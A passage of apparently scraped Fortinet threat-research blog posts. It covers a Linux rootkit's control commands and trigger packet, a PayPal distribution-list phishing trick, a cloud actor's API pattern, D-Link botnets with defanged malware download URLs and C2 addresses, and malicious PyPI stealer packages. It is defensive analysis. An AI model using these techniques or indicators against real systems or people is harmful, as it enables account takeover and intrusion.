“/proc/brtinfo” by invoking three dup2() system calls. Refer to Figure 11 for the corresponding ASM instructions that perform this action. These procfs entries are created in the kernel module. A callback function is assigned to each one, which is called when read or write operations occur. At the bottom of Figure 11, another system call, execv(), is invoked to replace the current process with a specified one, which in this case is “/bin/sh.” The attacker can now remotely execute any command with root privilege on the compromised system through the malicious kernel module (sysinitd.ko) and the child process (sysinitd -> /bin/sh). The parent process now begins performing tasks typically associated with a daemon process, such as managing the child process (e.g., starting, restarting, and killing the child process). It reads control commands from the file descriptor “/proc/rtinfo” and follows the different branches depending on the command values. As indicated in Figure 12, it reads the control command 0xE1. To archive this, the attacker must send this 4-byte packet\"\\x04\\xb4\\xfe\\xb3\". The supported control commands are listed in the following table: Command Action 0xE1 Restarts the child process. 0xE2 Kills the child process. 0xE3 Sends Ctrl+C to the child process. 0xE4 Kills both the child and parent process. Figure 13 is a screenshot of the output of the command “ps aux | grep –e “ sh” –e “bash,” where “sh” is the child process and “bash” is the parent process. Figure 14 illustrates how the attacker controls the compromised system via rootkit malware and the user-space process. We developed a Python script to simulate the attacker controlling the compromised Linux system. By leveraging the Python script to send numerous Linux commands to the compromised system, we can see the communication and command execution results, as shown in Figure 15, which is a Wireshark screenshot of the traffic data. The commands sent to the Linux system are “whoami,” “pwd,” “wget -O Fortinet.html -o summary www.fortinet.com,” and “ls -l fortinet.html.” In this analysis, we focused on the rootkit malware.  We first explained how the kernel module set a Netfilter hook function on NF_INET_PRE_ROUTING to hijack the incoming TCP traffic to the compromised system. Next, we elaborated on what related tasks the Netfilter hook function performs, including how it handles the attacker-init packet and the response packet format, invokes the user-space file, and exchanges data between the user-space process and the kernel module. You also learned how the user-space process is started, how it disguises itself as “bash,” how it creates the child process using a fork() system call, and how it is eventually replaced by “/bin/sh” to process the attacker’s Linux commands to control the system. Finally, we demonstrated how an attacker establishes a connection to a compromised system, sends Linux commands, and retrieves the result through traffic sniffing. Fortinet customers are already protected from this campaign. The FortiGuard Antivirus service detects the malicious files install.sh, sysinitd.ko, and sysinitd as: BASH/Injector.CSA!trELF64/Injector.CSA!trELF64/Injector.CSA!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. [install.sh]8D016D02F8FBE25DCE76481A90DD0B48630CE9E74E8C31BA007CF133E48B8526 [sysinitd.ko]6EDD7B3123DE985846A805931CA8EE5F6F7ED7B160144AA0E066967BC7C0423A [sysinitd]D57A2CAC394A778E19CE9B926F2E0A71936510798F30D20F207F2A49B49CE7B1 Reference:Burning Zero Days: Suspected Nation-State Adversary Targets Ivanti CSA linux,malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/deep-dive-into-a-linux-rootkit-malware"
  },
  {
    "title": "Phish-free PayPal Phishing",
    "content": "FortiGuard Labs Threat Research As a CISO, I am always on high alert for phishing attempts, and this recent example immediately set off alarm bells. Most obviously, why am I even receiving this request? I don’t use my corporate email address in PayPal. Additionally, the To: address, “Billingdepartments1[@]gkjyryfjy876.onmicrosoft.com,” is not mine. Usually, this would result in a ‘report and move on’ action from me, but I was a little intrigued. Whenever I see a phishing email, I always think, WWMMD (what would my Mum do?). How would I have responded based on all the methods I have told her to look for? Firstly, the sender address appears to be valid and not spoofed. …and the URL looks genuine. At this point, this seems to be a genuine email—at least, my mum might think so. So, what is going on? A genuine email can’t still be a problem, can it? Well, here is the catch in this instance. When you click on the link, you are redirected to a PayPal login page showing a request for payment. A panicked person may be tempted to log in with their account details, but this would be very dangerous. It links your PayPal account address with the address it was sent to—not where you received it. In this case, PayPal thinks it sent this request to Billingdepartments1[@]gkjyryfjy876.onmicrosoft.com The scammer appears to have simply registered an MS365 test domain, which is free for three months, and then created a Distribution List (Billingdepartments1[@]gkjyryfjy876.onmicrosoft.com) containing victim emails, as shown below: On the PayPal web portal, they simply request the money and add the distribution list as the address: This money request is then distributed to the targeted victims, and the Microsoft365 SRS (Sender Rewrite Scheme) rewrites the sender to, e.g., bounces+SRS=onDJv=S6[@]5ln7g7.onmicrosoft.com, which will pass the SPF/DKIM/DMARC check. Once the panicking victim logs in to see what is going on, the scammer’s account (Billingdepartments1[@]gkjyryfjy876.onmicrosoft.com) gets linked to the victim’s account. The scammer can then take control of the victim's PayPal account—a neat trick. It’s so neat, in fact, that it would sneak past even PayPal’s own phishing check instructions. The beauty of this attack is that it doesn’t use traditional phishing methods. The email, the URLs, and everything else are perfectly valid. Instead, the best solution is the Human Firewall—someone who has been trained to be aware and cautious of any unsolicited email, regardless of how genuine it may look. This, of course, highlights the need to ensure your workforce is receiving the training they need to spot threats like this to keep themselves—and your organization—safe. This is a perfectly valid email in most ways. However, it is still possible to create a DLP rule to look for multiple conditions that indicate that this email is being sent via a distribution list. The following rule will successfully identify such a case. phishing Industry Trends FortiGuard Labs Threat Research Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/phish-free-paypal-phishing"
  },
  {
    "title": "Catching \"EC2 Grouper\"- no indicators required!",
    "content": "FortiGuard Labs Threat Research Through the years of analyzing identity compromises in the cloud, we’ve seen the same attackers pop up regularly, some more frequently than others. Among the more prolific ones we’ve come to know is one we’ve dubbed “EC2 Grouper”. Over the past couple of years, we’ve seen this actor in several dozen customer environments, making them one of the more active groups we’ve tracked. This usual suspect is attributed by their penchant for using similar user agents and the same security group naming convention in their attacks. Whileindicatorssuch as user agents and even security group names can assist in attribution and hunting, we have found them unreliable for comprehensive threat detection. In this blog, we’ll detail tactics associated with EC2 Grouper and howLacework FortiCNAPPcan be leveraged to detect this threat, among others. More importantly, we will showcase how this is achieved without relying on actor-specific indicators, which can be transient in nature. EC2 Grouper is characterized by their usage of AWS tools for PowerShell to carry out attacks. This is presumed by their user agent, which was consistent for a number of years: AWSPowerShell.Common/4.1.90.0 .NET_Core/6.0.5 OS/Microsoft_Windows_10.0.17763 PowerShellCore/7.-1 ClientAsync In recent attacks, they have updated their UA, which now contains new versioning and unusual # characters, which could indicate a possible detection countermeasure. AWSPowerShell.Common/4.1.534.0 ua/2.0 .NET_Core#6.0.5 OS/windows#10.0.17763.0 md/ARCH#X64 PowerShellCore/7.-1 cfg/retry-mode#legacy md/ClientAsync A more consistent indicator has emerged with a security group naming convention. Attacks in the cloud often leverage the CreateSecurityGroup API (T1098)  to enable remote access and lateral movement in the cloud environment. EC2 Grouper will typically attempt to create multiple groups using the same naming convention of ec2group suffixed with a sequential combination of 1-5. Example request parameters: {\"groupDescription\":\"ec2group\",\"groupName\":\"ec2group\"} {\"groupDescription\":\"ec2group1\",\"groupName\":\"ec2group1\"} {\"groupDescription\":\"ec2group12\",\"groupName\":\"ec2group12\"} {\"groupDescription\":\"ec2group123\",\"groupName\":\"ec2group123\"} {\"groupDescription\":\"ec2group1234\",\"groupName\":\"ec2group1234\"} {\"groupDescription\":\"ec2group12345\",\"groupName\":\"ec2group12345\"} In all instances of EC2 Grouper attacks, cloud activity appears to be largely automated. The attacker will initially make calls to DescribeInstanceTypes to inventory EC2 types within the environment and then DescribeRegions to retrieve information about regions available for resources. Upon acquiring available regions, the following API calls are iteratively executed for every available region: Interestingly, we have never observed calls to AuthorizeSecurityGroupIngress, which is ultimately required to configure inbound access to any EC2 launched with the security group. However, on several occasions, we have observed CreateInternetGateway and CreateVpc, which are required for remote access. To date, we have not observed what could be classified as actions based on objectives or manual activity in a compromised cloud environment. It could be either that EC2 Grouper is selective in their escalation or compromised accounts were detected and quarantined before they had the opportunity to escalate. Despite this, resource hijacking (T1496) is likely the general objective. However, to what end is currently unconfirmed. In every attack involving valid accounts, the credentials must originate from somewhere. One of the more common sources for compromised keys remains code repositories. Developers often mistakenly commit cloud access keys to public repositories. Once this occurs, the clock starts ticking until the credentials fall into the hands of attackers, are discovered by secret scanners, or both. This is believed to be the primary method of credential acquisition for EC2 Grouper, as their cloud attacks are frequently accompanied by attacks from other threat actors. EC2 Grouper, however, is by far the most prolific actor allegedly using this vector. Given the popularity of obtaining credentials in code repositories, it can be prudent to look for legitimate secret scanning services as part of your detection strategy. These include GitGuardian and Github’s secret scanning service.In our composite alerts, we have included secret scanning as a signal, as it is frequently seen in conjunction with illicit credential usage. Of course, credential checking alone does not indicate a compromise, so other signals need to be correlated to reduce false positives. When alerting on EC2 Grouper, our composite alerts have evaluated other techniques, such as using specific APIs known to be leveraged in attacks. These are effectively mapped to the respective techniques with the assistance of the open-sourceTDiscoverproject. Finally, we evaluate anomalies as part of the composite alert. An alleged attack may exhibit characteristics indicative of malicious reconnaissance or privilege escalation. However, it's crucial to confirm this through anomaly detection. Identifying illicit usage of valid credentials in the cloud can be a nuanced and difficult task. This poses a considerable challenge when it comes to detection, as the vast majority of attacks in the cloud involve compromised credentials. While the attack detailed in this blog had various atomic indicators specific to the actors’ tactics and techniques, most attacks do not exhibit these unique characteristics. To achieve higher accuracy, it becomes more critical to correlate weaker signals involving aspects that attackers cannot control. For example, while attackers can easily control their source IP and user agent, theycannotcontrol whether it is anomalous to the environment. Similarly, they cannot control the APIs or sequence of APIs needed to carry out their objectives. By leveraging these as signals to a composite alerting mechanism, one can achieve a much higher level of detection efficacy. Cloud detection and response(CDR) is a crucial component in addressing cloud identity compromises such as the one documented here. With over 80% of attacks in the cloud involving compromised credentials, the effectiveness of your CDR solution can directly dictate the severity of a cloud attack.Lacework FortiCNAPPoffers comprehensive CDR protection with our innovative composite alerting technology. Cloud identity compromises can be difficult to isolate as they often blend in with legitimate activity. Lacework FortiCNAPP can evaluate numerous weak signals together through composite alerting, culminating in a much higher detection efficacy than point detection alone. Lacework FortiCNAPP also integrates other essential components, such asCIEMfor informing the blast-radius of a compromised identity. Read moreabout how Lacework FortiCNAPP can secure your cloud environment. cloud security Business and Technology Partners Business and Technology Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/catching-ec2-grouper-no-indicators-required"
  },
  {
    "title": "Botnets Continue to Target Aging D-Link Vulnerabilities",
    "content": "FortiGuard Labs Threat Research Affected Platforms:D-Link DIR-645 Wired/Wireless Router Rev. Ax with firmware 1.04b12 and earlier. D-Link DIR-806 devices. D-Link GO-RT-AC750 GORTAC750_revA_v101b03 and GO-RT-AC750_revB_FWv200b02. D-Link DIR-845L router v1.01KRb03 and beforeImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High FortiGuard Labs noticed a spike in the activity of two different botnets in October and November of 2024. One was the Mirai variant “FICORA,” and the other was the Kaiten variant “CAPSAICIN.” These botnets are frequently spread through documented D-Link vulnerabilities that allow remote attackers to execute malicious commands via a GetDeviceSettings action on the HNAP (Home Network Administration Protocol) interface. This HNAP weakness was first exposed almost a decade ago, with numerous devices affected by a variety of CVE numbers, including CVE-2015-2051, CVE-2019-10891, CVE-2022-37056, and CVE-2024-33112. According to our IPS telemetry, attackers frequently reuse older attacks, which accounts for the continued spread of the “FICORA” and “CAPSAICIN” botnets to victim hosts and infected targets. This article looks at their infected traffic and offers insights into these botnets. The attackers we identified spreading the “FICORA” botnet triggered the incident from 185[.]191[.]126[.]213 and 185[.]191[.]126[.]248, which are servers located in the Netherlands. Because this latest “FICORA” attack targeted many countries around the world, we speculate that this was not a targeted attack. “CAPSAICIN,” unlike “FICORA,” was only intensely active over two days—October 21 and 22, 2024. East Asian countries bore the brunt of those incidents by attackers actively spreading the “CAPSAICIN” botnet. The “FICORA” botnet downloads a shell script named “multi,” executes the script, and then removes it after execution. The shell script “multi” uses multiple strategies to download the malware “FICORA,” such as “wget,” “ftpget,” “curl,” and “tftp.” This downloader script first kills all processes with the same file extension as the malware “FICORA.” It then downloads and executes its various malware by targeting different Linux architectures, including “arc,” “arm,” “arm5,” “arm6,” “arm7,” “i486,” “i586,” “i686,” “m68k,” “mips,” “mipsel,” “powerpc,” “powerpc-440fp,” and “sparc.” The following analysis is based on “la.bot.arm7.” “FICORA” encodes its configuration with the ChaCha20 encryption algorithm. This configuration includes its C2 server domain and a unique string. The scanner in “FICORA” includes a hard-coded username and password for its brute force attack function. The malware also embeds a shell script with hexadecimal ASCII characters and constructs it during the scanner's execution. The shell script tries to identify any process containing the keyword “dvrHelper,” which is probably another malware and kills it. The malware “FICORA” is a variant of the Mirai malware. It can be identified by its similar architecture.It also includes DDoS attack functions using protocols like “UDP,” “TCP,” and “DNS.” The malware “CAPSAICIN”’s downloader is delivered from 87[.]10[.]220[.]221. The shell script “bins.sh” downloads and executes the malware “CAPSAICIN” with prefix file name “yakuza” targeting different Linux architectures, including “arm,” “arm5,” “arm6,” “arm7,” “i586,” “i686,” “m68k,” “mips,” “mipsel,” “ppc,” “sparc,” and “x86.” We will focus on “yakuza.x86” for the following analysis. Once we execute the malware, it pops up the string “CAPSAICIN” where the malware variant name is given. The malware kills known botnet processes to ensure it is the only botnet executing on the victim host. “CAPSAICIN” establishes a connection socket with its C2 server, “192[.]110[.]247[.]46,” and sends the victim host’s OS information and the nickname given by the malware back to the C2 server. It waits for a command from the C2 server to execute numerous functions listed below. Using its “PRIVMSG” function, “CAPSAICIN” sets up environment variables for more functions the C2 server can conduct using the following commands. In addition to the above commands, the “PRIVMSG” function can trigger DDoS attacks using the following commands from the C2 server. In addition to these attack functions, the malware includes a help message for each function to remind the attacker of needed parameters. The malware “CAPSAICIN” seems to be a variant based on the Keksec group’s botnets. According to hard-coded information found in version 17.0.0 of the malware developed by the Keksec group, we surmise that “CAPSAICIN” was developed based on that version. Although the weaknesses exploited in this attack had been exposed and patched nearly a decade ago, these attacks have remained continuously active worldwide. FortiGuard Labs discovered that “FICORA” and “CAPSAICIN” spread through this weakness. Because of this, it is crucial for every enterprise to regularly update the kernel of their devices and maintain comprehensive monitoring. These steps will help reduce the likelihood of malware being deployed through this vulnerability. The malware described in this report is detected and blocked byFortiGuard Antivirusas: ELF/Gafgyt.ST!trELF/Gafgyt.C!trELF/Gafgyt.AEA!trBASH/TrojanDownloader.SH!trBASH/Mirai.AEH!tr.dldrELF/Mirai.A!trELF/Mirai.CTQ!trELF/Mirai.CLY!trBASH/Agent.SHS!tr.dldr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 server. FortiGuard Labs provides IPS signature against attacks exploiting the following vulnerabilities: CVE-2015-2051: D-Link.Devices.HNAP.SOAPAction-Header.Command.ExecutionCVE-2019-10891: D-Link.Devices.HNAP.SOAPAction-Header.Command.ExecutionCVE-2022-37056: D-Link.Devices.HNAP.SOAPAction-Header.Command.ExecutionCVE-2024-33112: D-Link.Devices.HNAP.SOAPAction-Header.Command.Execution We also suggest that organizations go through Fortinet’sfree cybersecurity trainingmodule:Fortinet Certified Fundamentals(FCF) in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://103[.]149[.]87[.]69/multihxxp://103[.]149[.]87[.]69/la.bot.archxxp://103[.]149[.]87[.]69/la.bot.armhxxp://103[.]149[.]87[.]69/la.bot.arm5hxxp://103[.]149[.]87[.]69/la.bot.arm6hxxp://103[.]149[.]87[.]69/la.bot.arm7hxxp://103[.]149[.]87[.]69/la.bot.m68khxxp://103[.]149[.]87[.]69/la.bot.mipshxxp://103[.]149[.]87[.]69/la.bot.mipselhxxp://103[.]149[.]87[.]69/la.bot.powerpchxxp://103[.]149[.]87[.]69/la.bot.sh4hxxp://103[.]149[.]87[.]69/la.bot.sparc hxxp://87[.]11[.]174[.]141/bins.shhxxp://pirati[.]abuser[.]eu/yakuza.yak.shhxxp://pirati[.]abuser[.]eu/yakuza.arm5hxxp://pirati[.]abuser[.]eu/yakuza.arm6hxxp://pirati[.]abuser[.]eu/yakuza.arm7hxxp://pirati[.]abuser[.]eu/yakuza.i586hxxp://pirati[.]abuser[.]eu/yakuza.i686hxxp://pirati[.]abuser[.]eu/yakuza.m68khxxp://pirati[.]abuser[.]eu/yakuza.mipshxxp://pirati[.]abuser[.]eu/yakuza.mipselhxxp://pirati[.]abuser[.]eu/yakuza.ppchxxp://pirati[.]abuser[.]eu/yakuza.sparchxxp://pirati[.]abuser[.]eu/yakuza.x86hxxp://87[.]10[.]220[.]221/bins.shhxxp://87[.]10[.]220[.]221/yakuza.shhxxp://87[.]10[.]220[.]221/yakuza.arm4hxxp://87[.]10[.]220[.]221/yakuza.arm5hxxp://87[.]10[.]220[.]221/yakuza.arm6hxxp://87[.]10[.]220[.]221/yakuza.arm7hxxp://87[.]10[.]220[.]221/yakuza.i586hxxp://87[.]10[.]220[.]221/yakuza.i686hxxp://87[.]10[.]220[.]221/yakuza.m68khxxp://87[.]10[.]220[.]221/yakuza.mipshxxp://87[.]10[.]220[.]221/yakuza.mipselhxxp://87[.]10[.]220[.]221/yakuza.ppchxxp://87[.]10[.]220[.]221/yakuza.sparchxxp://87[.]10[.]220[.]221/yakuza.x86 103[.]149[.]87[.]69ru[.]coziest[.]lolf[.]codingdrunk[.]ccwww[.]codingdrunk[.]ineighteen[.]piratenineteen[.]libre75cents[.]libre2joints[.]librefortyfivehundred[.]dyn21savage[.]dynimaverygoodbadboy[.]librele[.]codingdrunk[.]in87[.]11[.]174[.]141pirati[.]abuser[.]eu87[.]10[.]220[.]22145[.]86[.]86[.]60194[.]110[.]247[.]46 f71dc58cc969e79cb0fdfe5163fbb9ed4fee5e13cc9407a11d231601ee4c6e23ea83411bd7b6e5a7364f7b8b9018f0f17f7084aeb58a47736dd80c99cfeac7f148a04c7c33a787ef72f1a61aec9fad87d6bd9c49542f52af7e029ac83475f45d18c92006951f93a77df14eca6430f32389080838d97c9e47364bf82f6c21a907 9b161a32d89f9b19d40cd4c21d436c1daf208b5d159ffe1df7ad5fd1a57610e5faeea9d5091384195e87caae9dd88010c9a2b3b2c88ae9cac8d79fd94f250e9f10d7aedc963ea77302b967aad100d7dd90d95abcdb099c5a0a2df309c52c32b87f6912de8bef9ced5b9018401452278570b4264bb1e935292575f2c3a0616ec4a06fd0b8936f5b2370db5f7ec933d53bd8a1bf5042cdc5c052390d1ecc7c0e07764a03bf28f9eec50a1bd994308e977a64201fbe5d41337bdcc942c74861bcd3df176fb8cfbc7512c77673f862e73833641ebb0d43213492c168f99302dcd5e3ac2df391ede03df27bcf238077d2dddcde24cd86f16202c5c51ecd31b7596a68ca3f6dce945ccad5a50ea01262b2d42171f893632fc5c5b8ce4499990e978e5bafee245b6f999f6b9d0dd997436df5f2abfb3c8d2a8811ff57e3c21637207d62ec508df7cb142a639b0c33f710d5e49c29a5a578521b6306bee28012aadde4a8 CAPSAICIN 8349ba17f028b6a17aaa09cd17f1107409611a0734e06e6047ccc33e8ff669b0b3ad8409d82500e790e6599337abe4d6edf5bd4c6737f8357d19edd82c88b064ec87dc841af77ec2987f3e8ae316143218e9557e281ca13fb954536aa9f9caf1784c9711eadceb7fedf022b7d7f00cff7a75d05c18ff726e257602e3a3ccccc1bde6ef047e0880ac7ef02e56eb87d5bc39116e98ef97a5b1960e9a55cea5082bc7be8d1b8948e1cb095d46376ced64367718ed2d9270c2fc99c7052a9d1ffed74600703535e35b464f0198a1fa95e3668a0c956ab68ce7b719c28031d69b86ff6e3ef9404817e168c974000205b27723bc93abd7fbf0581c16bb5d2e1c5c6e4a32e66b87f47245a892b102b7141d3845540b270c278e221f502807758a4e5dee540c00e6c0b53332128b605b0d5e0926db0560a541bb13448d094764844763dfb74dbd02b7ebb51700f3c5900283e46570fe497f9b415d25a029623118073519148f6b990fc1f1903287cd5c20276664b332dd3ba8d58f2bf8c26334c93c3af5464e2f1faab2a40db44f118f7c3d1f9b300297fe6ced83fabe87563fc82efe95b699cd64b9895cdcc325d7dd96c9eca623d3ec0247d20f39323547132c8fa63b1007f5613a91a5d4170f28e24bfa704c8a63d95a2b4d033ff2bff7e2fe3dcffe7a815d4ca3771de8a71cde2bdacf951bf48ea5854eb0a2af5db7d13ad51c44abd6a2a22000d68d79caeae482d8cf092c2d84d55dccee05e179a961c72f77b1ba7ab36a93f009058e60c8a45b900c1c7ae38c96005a43a39e45be9dc7af9d6da8803abfe19cdc6c0c41acfeb210a2361cab96d5926b2c43e5eb3b589a6ed189ad7b29053306f194ca75021952f97f894d8eae6d2e1d02939df37b62d3845bfdb759704cf55b9fa439d6f7a36821a50178e9d73ddc5407ff340460c054d7defc54aaa49b7b4f1e71623c42bc77bb7aa40534bcb7312da511b041799bf0e1a63ee71ca1d5a53c4379c3015c74af2b18c1d9285ac1a48d515f9b7827e4f900a61bde botnets FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/botnets-continue-to-target-aging-d-link-vulnerabilities"
  },
  {
    "title": "Analyzing Malicious Intent in Python Code: A Case Study",
    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms where PyPI packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, etc.Severity level:High Fortinet's AI-driven OSS malware detection system recently identified two malicious packages: Zebo-0.1.0 on November 16, 2024, and Cometlogger-0.1 on November 24, 2024. Malicious software often masquerades as legitimate code, hiding its harmful features behind complex logic and obfuscation. In this analysis, we examine the Python scripts behind these two packages, outline their malicious behaviors, and provide insights into their potential impact. The Zebo-0.1.0 script is a typical example of malware, with functions designed for surveillance, data exfiltration, and unauthorized control. It uses libraries like pynput and ImageGrab, along with obfuscation techniques, indicating clear malicious intent. The Cometlogger-0.1 script also shows signs of malicious behavior, including dynamic file manipulation, webhook injection, stealing information, and anti-VM checks. Zebo-0.1.0 is structured to perform various tasks that violate user privacy and security. Its main components include: Obfuscation:bypass detection mechanismsKeylogging:Capturing every keystroke typed by the user.Screen Capturing:Periodic screenshots of the user's desktop.Data Exfiltration:Uploading sensitive information (keystrokes, screenshots, etc.) to a remote server.Persistence Mechanism:Ensuring the malware re-executes upon system startup. Using obfuscation intentionally hides the true functionality, making it harder for users or security systems to understand what the code is doing. In this example, if the script or its components are obfuscated, it could hide malicious behavior, such as unauthorized data collection or system manipulation. Obfuscation can also be used to bypass security measures, potentially allowing malware to run undetected, which poses serious risks to both the user’s privacy and system integrity. The code uses hex-encoded strings (e.g., \\x68\\x74\\x74...) to hide the URL of the server it communicates with. It employs a command and control mechanism via HTTP requests to a remote server, which is used to manage the malware's behavior and collect stolen data.This obfuscation is a clear sign of malicious intent, as it seeks to bypass detection mechanisms during code review or automated scans. The use of the pynput library enables the script to log every keystroke made by the user. This feature is implemented through the following functions: Screen capturing can secretly record the user's screen, potentially violating their privacy and leading to unauthorized access to sensitive information. In the provided code, the post-installation script could be used to implement such functionality, allowing an attacker to monitor the user's activities without their consent. This is considered malicious behavior, as it can be used to steal personal information or perform other harmful actions, and it can lead to significant security risks, including data breaches and legal consequences. Using data exfiltration in this code is dangerous because it involves secretly collecting and transferring sensitive data from the user's system without their knowledge or consent. The post-installation script (i_am_cute()) can be used for unauthorized data access, potentially sending private information to a remote server. This could violate privacy, compromise security, and result in legal consequences for the software developer or distributor if the behavior is discovered, as it may be seen as a form of hacking or data theft. Logs and screenshots are sent to a Firebase database, exposing the user’s sensitive data to unauthorized parties. This is executed through HTTP PUT requests: To ensure it runs every time the system starts, the malware: The code provided raises several red flags indicative of potential malicious activity. Webhook Manipulation:The code dynamically requests a \"webhook\" from the user and embeds it into Python files like `Comet.py` and `Exela.py.’Information Theft:Steals tokens, passwords, and accounts from various platforms (Discord, Steam, Instagram, Twitter, etc.)Anti-VM Detection:Virtualization environments to evade analysis or sandboxing.Dynamic File Modification:The scripts modify Python files at runtime, a method that can enable malicious code injection for exploitation during execution.Persistence:Maintain long-term presence on the victim’s system. Security Risks: Injecting a webhook URL directly into the code allows for potential manipulation by unauthorized users, opening the door to malicious attacks. If attackers alter the webhook URL, it could redirect sensitive data to malicious servers, compromising security. Data Integrity: Allowing dynamic changes to webhooks during runtime can result in unintentional modifications, leading to incorrect or inconsistent data being sent. This could affect the system's functionality and lead to miscommunication between services. Malicious Exploitation: By hardcoding the webhook injection in multiple places, this approach can be exploited to execute malicious code. Since the code can be easily modified and reused, attackers could send harmful payloads through the webhook, potentially damaging systems or stealing data. The script repeatedly prompts users for a webhook, dynamically injecting it into files Injected webhooks could: Send sensitive information to a remote server. Facilitate command-and-control (C2) operations, allowing an attacker to issue commands remotely. The script from comet.py poses significant risks by violating user privacy through the collection of saved passwords, session cookies, and browsing history, which can be exploited to impersonate users, steal financial data, or compromise accounts. For organizations, this malware threatens unauthorized access to corporate accounts and data breaches, potentially leading to severe legal and financial consequences. Additionally, by targeting cookies from platforms like Instagram, TikTok, and Twitter, it enables account hijacking for spam, scams, or identity theft. Attackers often use anti-VM techniques to identify if their code is running in a sandbox or virtual machine, commonly used by researchers or security tools.The code checks for common virtualization indicators such as \"VMware\" and \"VirtualBox\".If such indicators are found, the code terminates execution to avoid detection.This allows attackers to bypass security monitoring in controlled environments. The Fake Error Message can trick users into running the malware code. Security Concerns: The code modifies files based on user inputs, potentially altering sensitive data like webhooks. This opens the door for malicious exploitation if an attacker provides malicious input or manipulates the file content. Data Integrity Risks: The use of replace operations without validation can lead to unintentional changes or corruption of files, especially if the files are being used by other processes or applications concurrently. Malware Risks: The integration with UPX, which compresses executables, raises concerns regarding the execution of malicious code. The UPX tool is commonly used to obfuscate malware, making it harder for security tools to detect it. The code modifies external files (Comet.py and Exela.py) without verifying their content or purpose: Security Risks: UPX can obfuscate the code, making it harder for security tools to analyze the executable. This could lead to undetected malicious behavior if used in malicious software. Compatibility Issues: UPX compression might cause problems with certain antivirus software or system configurations, as some security tools may flag compressed executables as suspicious, leading to false positives. Performance Impact: While UPX reduces file size, the decompression at runtime could introduce delays, affecting the performance of the application, especially if it's used excessively in critical areas of the code. The frequent invocation of utils/upx.exe using subprocess.call is highly suspicious: Continuous exception loops can lead to several problems, such as consuming excessive CPU resources, causing system freezes, and degrading performance. They may also obscure the root cause of the issue, making debugging more difficult. If exceptions are raised without proper handling, the program becomes unresponsive and harder to maintain. The script employs an infinite loop to persist in the user's environment: Disconnect from the Internet: Immediately isolate the infected system to prevent further data exfiltration. Run Antivirus Tools: Use reputable antivirus software to detect and remove the malware. Reformat the System: If the infection persists, reformat the system and reinstall the OS. Code Review: Always verify third-party scripts and executables before running them. Network Monitoring: Implement firewalls and intrusion detection systems to identify suspicious network activity. Education: Train users to recognize phishing attempts and avoid executing unverified scripts. This malicious Python script (Zebo-0.1.0) is a textbook example of malware, exhibiting functionalities designed for surveillance, data exfiltration, and unauthorized control. Its sophisticated use of libraries like pynput and ImageGrab, coupled with obfuscation techniques, demonstrates a clear intent to harm or exploit users. Such scripts highlight the importance of cybersecurity awareness and robust defensive measures. The script (Cometlogger-0.1) exhibits several hallmarks of malicious intent, including dynamic file manipulation, webhook injection, steal information, ANTI-VM. While some features could be part of a legitimate tool, the lack of transparency and suspicious functionality make it unsafe to execute. Always scrutinize code before running it and avoid interacting with scripts from unverified sources. FortiGuard AntiVirusdetects the malicious files identified in this report as zebo_0.1.0: Python/Agent.BZ!trrunner.py:Python/Agent.BZ!trCometlogger_0.1: Python/Agent.APQ!trcomet.py: Python/Agent.APQ!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Package/file name Sha256 Detection Zebo_0.1.0 4aeb0211bd6d9e7c74c09ac67812465f2a8e90e25fe04b265b7f289deea5db21 Python/Agent.BZ!tr zebo_0.1.0/runner.py 4aeb0211bd6d9e7c74c09ac67812465f2a8e90e25fe04b265b7f289deea5db21 Python/Agent.BZ!tr cometlogger_0.1 839d0cfcc52a130add70239b943d8c82c4234b064d6f996eeaae142f05cc9e85 Python/Agent.APQ!tr cometlogger_0.1/comet.py e01c61dc52514b011c83c293cf19092c40cb606a28a87675b4f896be5afebed2 Python/Agent.APQ!tr python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/analyzing-malicious-intent-in-python-code"
  },
  {
    "title": "Fortinet Contributes to Major Cybercrime Operation Arrests",
